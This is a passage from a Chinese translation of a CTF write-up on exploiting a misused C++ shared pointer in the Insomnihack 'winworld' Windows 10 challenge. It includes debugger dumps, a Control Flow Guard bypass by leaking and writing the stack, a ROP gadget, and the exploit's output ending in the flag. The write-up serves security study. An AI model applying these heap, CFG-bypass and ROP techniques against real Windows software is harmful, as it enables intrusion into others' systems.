000001cf`94daeac0&nbsp;00000000`20010001&nbsp;00000000`00000000
000001cf`94daead0&nbsp;0000003d`00000020&nbsp;0000000a`00000004
0:000&gt;&nbsp;!heap&nbsp;-x&nbsp;000001cf`94d949b0Entry&nbsp;User&nbsp;Heap&nbsp;Segment&nbsp;Size&nbsp;PrevSize&nbsp;Unused&nbsp;Flags
-------------------------------------------------------------------------------------------------------------
000001cf94d949a0&nbsp;000001cf94d949b0&nbsp;000001cf94d30000&nbsp;000001cf94dafb50&nbsp;a0&nbsp;-&nbsp;10&nbsp;LFH;busy&nbsp;
0:000&gt;&nbsp;dq&nbsp;000001cf`94d949b0000001cf`94d949b0&nbsp;000001cf`94dfb410&nbsp;000001cf`94d90ce0
000001cf`94d949c0&nbsp;000001cf`94dac580&nbsp;000001cf`94d90800
000001cf`94d949d0&nbsp;000001cf`94d98f90&nbsp;000001cf`94d911c0
000001cf`94d949e0&nbsp;000001cf`94d99030&nbsp;000001cf`94d912e0&nbsp;#&nbsp;string&nbsp;pointer000001cf`94d949f0&nbsp;000001cf`94db4cf0&nbsp;000001cf`94d91180&nbsp;#&nbsp;string&nbsp;size000001cf`94d94a00&nbsp;000001cf`94db7e60&nbsp;000001cf`94d912a0
000001cf`94d94a10&nbsp;000001cf`94e97c70&nbsp;000001cf`94d91300
000001cf`94d94a20&nbsp;7320756f`590a2e73&nbsp;73696874`20776f68
0:000&gt;&nbsp;dps&nbsp;poi(000001cf`94d949b0+8+0n24*2)&nbsp;L3000001cf`94d912e0&nbsp;00007ff7`9b9f7158&nbsp;winworld!std::_Ref_count&lt;Person&gt;::`vftable&#39;000001cf`94d912e8&nbsp;00000001`00000005
000001cf`94d912f0&nbsp;000001cf`94d99030</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, sans-serif; text-indent: 28px;">这个vector现在属于和Person对象相同的LFH。如果我们喷射0xf0字符串接着0x10 7-friends vectors，我们能够泄漏指针：在winworld中的一个虚表地址和堆。我们应该能用0xff字符串来做到这个，然后是一个friends vectors，但是有一些分配有时会发生，我还没调试出什么引起的。</span></p><p style="white-space: normal; text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, sans-serif"></span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">尽管我们不能控制大小，它是巨大的，因此二进制不可避免的将崩溃！好消息是Windows上的堆和栈的随机只在每次启动时发生一次。每个进程都随机好了。这是不好的，但是因为二进制文件自动重启不是个问题，因此我们已经泄露了模块基地址，并且我们能够在子过程中复用它。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">注意：当你开发一个Windows利用时，不要把二进制文件放在linux主机共享中，这会导致每次执行都随机化！</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif"><br/></span></strong></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif">0x05&nbsp;绕过CFG</span></strong></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif"></span></p><hr/><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif">CFG是微软的控制流完整性方案，它基于任何非直接调用必须指向函数开头的简单思想。在非直接调用之前会有__guard_check_icall_fptr插入：</span><br/></p><p style="white-space: normal;text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img src="http://p8.qhimg.com/t014c1745b50240a52b.png" title="t0144e90b1f20336b70.png" alt="http://p6.qhimg.com/t0144e90b1f20336b70.png"/></span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">在Windows 10中这将调用ntdll!LdrpValidateUserCallTarget来检验指针是否是一个可靠的函数开头，如果不是则终止。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">CFG的优势是能强制中断一个合法的程序（因此没有原因不使用它）。然而CFG有3个常见的缺陷：</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif;">1. 与验证函数参数和返回值的类型的CFI机制相比， 被允许的目标的集合还是太大。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif;">2. 它不能保护栈，因为返回地址不是函数开头。微软将使用RFG来修复这个并且将来Intel处理器也支持，但是还是不够强。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif;">3. 如果加载了一个没有使用CFG编译的模块，该模块的所有的地址都是被允许的。JIT可能有问题。（这里的二进制和所有模块都支持CFG和没有JIT）</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">当我写这个文章的时候，一篇</span><a href="https://improsec.com/blog/bypassing-control-flow-guard-in-windows-10" style="font-family: 微软雅黑, sans-serif; color: rgb(227, 108, 9); text-decoration: none;"><strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(227, 108, 9);">绕过CFG的博文</span></strong></a><span style="font-family: 微软雅黑, sans-serif">就已经发布了，即利用kernel32！RtlCaptureContext（缺陷1）。j00ru是唯一一个解决这个任务的人，使用它来泄漏栈，但是我没有使用这个，而是选择了手动泄漏/写栈（缺陷2）。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">我们已经使用了std::string name属性来实现任意读取，现在我们也能够使用它来实现任意写！唯一需要的是将字符串替换为不比当前std::string对象最大大小更多的字节。这非常酷，然而目前为止我们还不知道栈（或者堆）在哪里，并且每次运行程序的库都会随机。我们后面会回到这。首先我们也想泄漏其他库的地址。</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif"><br/></span></strong></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif">0x06&nbsp;泄漏其他库</span></strong></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif"></span></p><hr/><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif">使用二进制基址和0x100个persons字符串的喷射，我们足够泄漏任意的内存地址。 我们能保留vectors为空字符串，来阻止调用Person::printInfos时崩溃。</span><br/></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">现在我们已经有了二进制的基址，并且知道下次启动才会改变，泄漏其他库是个尝试：我们能转储IAT的入口。我的利用充分利用了ucrtbase.dll和ntdll.dll（在CFG中总是存在IAT），能通过构造一个std::string指向下面地址来完成泄漏：</span></p><pre class="brush:bash;toolbar:false">0:000&gt;&nbsp;dps&nbsp;winworld+162e8&nbsp;L1
00007ff7`9b9f62e8&nbsp;00007ffa`86d42360&nbsp;ucrtbase!strtol
0:000&gt;&nbsp;dps&nbsp;winworld+164c0&nbsp;L2
00007ff7`9b9f64c0&nbsp;00007ffa`89b164a0&nbsp;ntdll!LdrpValidateUserCallTarget
00007ff7`9b9f64c8&nbsp;00007ffa`89b164f0&nbsp;ntdll!LdrpDispatchUserCallTarget</pre><p style="white-space: normal; text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, sans-serif; text-indent: 28px;">重复泄漏，我们能用gets()的地址来覆盖onEncounter的方法指针，一旦我们定位了ucrtbase.dll的基址。这当然是因为这个任务特殊的上下文，其标准输入输出流重定向到了客户端套接字上。这将触发gets(this_object)堆溢出，我们能使用来覆盖名字字符串的属性。</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif"><br/></span></strong></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif">0x07&nbsp;泄漏栈</span></strong></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif"></span></p><hr/><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif">在哪找栈指针？我们能从ntdll找到PEB的指针，然而在x64中PEB结构不包含指向TEB的指针。</span><br/></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">一个最近的</span><a href="http://j00ru.vexillium.org/?p=2835" style="font-family: 微软雅黑, sans-serif; color: rgb(227, 108, 9); text-decoration: none;"><strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(227, 108, 9);">j00ru的博文</span></strong></a><span style="font-family: 微软雅黑, sans-serif">描述了一个有趣的事实：尽管没有好的原因在堆上面存储栈指针，但是在进程初始化期间可能会有一些剩余的堆栈数据被无意复制到堆中。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">他的博文在x86上描述了它，让我们在x64上面的堆中找下隐藏的栈指针：</span></p><pre class="brush:bash;toolbar:false">0:001&gt;&nbsp;!address
[...]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BaseAddress&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EndAddress+1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RegionSize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;State&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Protect&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Usage
--------------------------------------------------------------------------------------------------------------------------
[...]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3b`b6cfb000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3b`b6d00000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0`00005000&nbsp;MEM_PRIVATE&nbsp;MEM_COMMIT&nbsp;&nbsp;PAGE_READWRITE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Stack&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[~0;&nbsp;2524.1738]
[...]
0:001&gt;&nbsp;!heap
&nbsp;Heap&nbsp;Address&nbsp;NT/Segment&nbsp;Heap&nbsp;17c262d0000&nbsp;NT&nbsp;Heap
&nbsp;17c26120000&nbsp;NT&nbsp;Heap
0:001&gt;&nbsp;!address&nbsp;17c262d0000&nbsp;Usage:&nbsp;Heap
Base&nbsp;Address:&nbsp;0000017c`262d0000End&nbsp;Address:&nbsp;0000017c`26332000[...]
0:001&gt;&nbsp;.for&nbsp;(r&nbsp;$t0&nbsp;=&nbsp;17c`262d0000;&nbsp;@$t0&nbsp;&lt;&nbsp;17c`26332000;&nbsp;r&nbsp;$t0&nbsp;=&nbsp;@$t0&nbsp;+&nbsp;8)&nbsp;{&nbsp;.if&nbsp;(poi(@$t0)&nbsp;&gt;&nbsp;3b`b6cfb000&nbsp;&amp;&nbsp;poi(@$t0)&nbsp;&lt;&nbsp;3b`b6d00000)&nbsp;{&nbsp;dps&nbsp;$t0&nbsp;L1&nbsp;}&nbsp;}
0000017c`262d2d90&nbsp;0000003b`b6cff174
0000017c`262deb20&nbsp;0000003b`b6cffbd8
0000017c`262deb30&nbsp;0000003b`b6cffbc8
0000017c`262deb80&nbsp;0000003b`b6cffc30
0000017c`2632cf80&nbsp;0000003b`b6cff5e0
0000017c`2632cfc0&nbsp;0000003b`b6cff5e0
0000017c`2632d000&nbsp;0000003b`b6cff5e0
0000017c`2632d1a0&nbsp;0000003b`b6cff5e0
0000017c`2632d2c0&nbsp;0000003b`b6cff5e0
0000017c`2632d4e0&nbsp;0000003b`b6cff5e0
0000017c`2632d600&nbsp;0000003b`b6cff5e0
0000017c`2632d660&nbsp;0000003b`b6cff5e0
0000017c`2632d6e0&nbsp;0000003b`b6cff5e0
0000017c`2632d700&nbsp;0000003b`b6cff5e0
0:000&gt;&nbsp;dps&nbsp;winworld+1fbd0&nbsp;L3
00007ff7`9b9ffbd0&nbsp;0000017c`2632ca8000007ff7`9b9ffbd8&nbsp;0000017c`262da050
00007ff7`9b9ffbe0&nbsp;0000017c`2632cf20</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, sans-serif; text-indent: 28px;">好的！我们确实在默认堆上面找到了栈指针，并且我们能从winworld基址来泄漏堆中静态偏移的地址。</span></p><p style="white-space: normal; text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, sans-serif"></span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">现在我们能浏览堆页，并且试图找到这些栈地址。在我的利用中为了简单，我使用了一个简单启发的方式来找到QWORDS在堆下面，但也高于100000000，交互式询问哪个可以作为栈泄漏。这明显可以改进。</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif"><br/></span></strong></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif">0x08&nbsp;缓解措施和ROP</span></strong></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif"></span></p><hr/><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif">现在我们已经有任意写了并且能覆盖栈上面的RIP地址，剩下的就是构建ROP了。几个想法如下：</span></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif; color: rgb(49, 133, 155);">VirtualProtect，然后shellcode</span></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif; color: rgb(49, 133, 155);">加载SMB上面的库</span></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif; color: rgb(49, 133, 155);">执行一个shell命令（WinExec等）</span></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif; color: rgb(49, 133, 155);">完整的ROP来读取标记</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">正如早前提到的，二进制有一些最新的</span><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088(v=vs.85).aspx"><span style="font-family: 微软雅黑, sans-serif">缓解措施</span></a><span style="font-family: 微软雅黑, sans-serif">，在我们的上下文中是相关联的：</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif;">ProcessDynamicCodePolicy：阻止插入新的可执行内存，VirtualProtect将失败</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif;">ProcessSignaturePolicy：库必须被签名，组织了LoadLibrary</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif;">ProcessImageLoadPolicy：库不能从远程位置加载，组织了加载SMB上的库</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">最后两个选项依然可以用。我也想在父进程AppJailLauncher进程中添加一个使用PROC_THREAD_ATTRIBUTE_CHILD_PROCESS_POLICY的UpdateProcThreadAttribute的调用，将阻止winworld创建新进程，但是因为是一个控制台程序，winworld也会带起一个conhost.exe进程。使用这个缓解措施能阻止conhost.exe的创建，并且因此程序不能运行。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">我的解决方案在ROP中直接读取。因为我不想陷入CreateFile和Windows句柄的麻烦中，我代替使用了ucrtbase.dll中的_sopen_s/_read/puts/_flushall函数。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">在ntdll中查找小配件，我们能找到x64调用规则的pop前四个寄存器的完美的小配件。小配件在CFG中是它自己，这非常惊喜，可以进入rop链了。</span></p><pre class="brush:bash;toolbar:false">0:000&gt;&nbsp;u&nbsp;ntdll+96470&nbsp;L5
ntdll!LdrpHandleInvalidUserCallTarget+0x70:
00007ffa`89b16470&nbsp;5a&nbsp;pop&nbsp;rdx
00007ffa`89b16471&nbsp;59&nbsp;pop&nbsp;rcx
00007ffa`89b16472&nbsp;4158&nbsp;pop&nbsp;r8
00007ffa`89b16474&nbsp;4159&nbsp;pop&nbsp;r9
00007ffa`89b16476&nbsp;c3&nbsp;ret</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, sans-serif; text-indent: 28px;">最终整合到一起：</span></p><p style="white-space: normal; text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, sans-serif"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;Z:\awe\insomnihack\2017\winworld&gt;python&nbsp;sploit.py&nbsp;getflag&nbsp;remote
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Discovering&nbsp;the&nbsp;PRNG&nbsp;seed...
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Clock&nbsp;not&nbsp;synced&nbsp;with&nbsp;server...
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Resynced&nbsp;clock,&nbsp;delay&nbsp;of&nbsp;-21&nbsp;seconds
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Found&nbsp;the&nbsp;maze&nbsp;center:&nbsp;(38,&nbsp;41)
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Check&nbsp;the&nbsp;map&nbsp;for&nbsp;people&nbsp;positions
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Make&nbsp;sure&nbsp;that&nbsp;LFH&nbsp;is&nbsp;enabled&nbsp;for&nbsp;bucket&nbsp;of&nbsp;sizeof(Person)
&nbsp;&nbsp;&nbsp;&nbsp;6&nbsp;/&nbsp;6&nbsp;...
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Spray&nbsp;0x100&nbsp;std::string&nbsp;to&nbsp;force&nbsp;future&nbsp;initialization&nbsp;of&nbsp;pwnrobot-&gt;is_conscious
&nbsp;&nbsp;&nbsp;&nbsp;256&nbsp;/&nbsp;256&nbsp;...
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Cloning&nbsp;host,&nbsp;with&nbsp;uninitialized&nbsp;memory&nbsp;this&nbsp;one&nbsp;should&nbsp;have&nbsp;is_conscious...
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Removing&nbsp;current&nbsp;friends&nbsp;of&nbsp;pwnrobot...
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Moving&nbsp;a&nbsp;guest&nbsp;to&nbsp;the&nbsp;maze&nbsp;center&nbsp;(37,&nbsp;86)&nbsp;-&gt;&nbsp;(38,&nbsp;41)...
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Moving&nbsp;our&nbsp;host&nbsp;to&nbsp;the&nbsp;maze&nbsp;center&nbsp;(38,&nbsp;29)&nbsp;-&gt;&nbsp;(38,&nbsp;41)...
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;pwnrobot&nbsp;should&nbsp;now&nbsp;be&nbsp;a&nbsp;human...&nbsp;kill&nbsp;him!
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Removing&nbsp;all&nbsp;pwnrobot&#39;s&nbsp;friends...
&nbsp;&nbsp;&nbsp;&nbsp;7&nbsp;/&nbsp;7&nbsp;...
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Decrement&nbsp;the&nbsp;refcount&nbsp;of&nbsp;pwnrobot&#39;s&nbsp;human&nbsp;share_ptr&nbsp;to&nbsp;0&nbsp;-&gt;&nbsp;free&nbsp;it
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Spray&nbsp;0x100&nbsp;std::string&nbsp;to&nbsp;trigger&nbsp;UAF
&nbsp;&nbsp;&nbsp;&nbsp;256&nbsp;/&nbsp;256&nbsp;...
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;heap&nbsp;leak:&nbsp;0x18a6eae8b40
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Leaking&nbsp;stack&nbsp;ptr...
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Dumping&nbsp;heap&nbsp;@&nbsp;0x18a6eae6b40...
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Dumping&nbsp;heap&nbsp;@&nbsp;0x18a6eae7b40...
&nbsp;&nbsp;&nbsp;&nbsp;[HEAP]&nbsp;0x18a6eae7b40
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[00]&nbsp;-&nbsp;0x18a6ea96c72
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[01]&nbsp;-&nbsp;0x18a6ea9c550
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[02]&nbsp;-&nbsp;0x18a6ea9e6e0
&nbsp;&nbsp;&nbsp;&nbsp;Use&nbsp;which&nbsp;qword&nbsp;as&nbsp;stack&nbsp;leak?
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Dumping&nbsp;heap&nbsp;@&nbsp;0x18a6eae8b40...
&nbsp;&nbsp;&nbsp;&nbsp;[HEAP]&nbsp;0x18a6eae8b40
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[00]&nbsp;-&nbsp;0x3ab7faf120
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[01]&nbsp;-&nbsp;0x3ab7faf4f0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[02]&nbsp;-&nbsp;0x18a6ea9c550
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[03]&nbsp;-&nbsp;0x18a6eae84c0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[04]&nbsp;-&nbsp;0x18a6eae8560
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[05]&nbsp;-&nbsp;0x18a6eae8760
&nbsp;&nbsp;&nbsp;&nbsp;Use&nbsp;which&nbsp;qword&nbsp;as&nbsp;stack&nbsp;leak?&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;stack&nbsp;@&nbsp;0x3ab7faf4f0
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Leaking&nbsp;stack&nbsp;content...
&nbsp;&nbsp;&nbsp;&nbsp;[-]&nbsp;Haven&#39;t&nbsp;found&nbsp;saved&nbsp;RIP&nbsp;on&nbsp;the&nbsp;stack.&nbsp;Increment&nbsp;stack&nbsp;pointer...
&nbsp;&nbsp;&nbsp;&nbsp;[-]&nbsp;Haven&#39;t&nbsp;found&nbsp;saved&nbsp;RIP&nbsp;on&nbsp;the&nbsp;stack.&nbsp;Increment&nbsp;stack&nbsp;pointer...
&nbsp;&nbsp;&nbsp;&nbsp;[-]&nbsp;Haven&#39;t&nbsp;found&nbsp;saved&nbsp;RIP&nbsp;on&nbsp;the&nbsp;stack.&nbsp;Increment&nbsp;stack&nbsp;pointer...
&nbsp;&nbsp;&nbsp;&nbsp;RIP&nbsp;at&nbsp;offset&nbsp;0x8
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Overwrite&nbsp;stack&nbsp;with&nbsp;ROPchain...
&nbsp;&nbsp;&nbsp;&nbsp;[+]&nbsp;Trigger&nbsp;ROP&nbsp;chain...
&nbsp;&nbsp;&nbsp;&nbsp;Better&nbsp;not&nbsp;forget&nbsp;to&nbsp;initialize&nbsp;a&nbsp;robot&#39;s&nbsp;memory!Flag:&nbsp;INS{I&nbsp;pwn,&nbsp;therefore&nbsp;I&nbsp;am!}[+]&nbsp;Exploit&nbsp;completed.</pre><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif"><br/></span></strong></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif">0x09&nbsp;总结</span></strong></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif"></span></p><hr/><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif">你能在</span><a href="https://github.com/Insomnihack/Teaser-2017/blob/master/winworld/exploit/sploit.py" style="font-family: 微软雅黑, sans-serif; color: rgb(227, 108, 9); text-decoration: none;"><strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(227, 108, 9);">这里</span></strong></a><span style="font-family: 微软雅黑, sans-serif">找到完整的利用。</span><br/></p><p><span style="font-family: 微软雅黑, sans-serif"></span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://blog.scrt.ch/2017/01/27/exploiting-a-misused-c-shared-pointer-on-windows-10/" target="_blank">原文链接：https://blog.scrt.ch/2017/01/27/exploiting-a-misused-c-shared-pointer-on-windows-10/</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】在Windows10中利用一个误用的C++共享指针 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3468" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
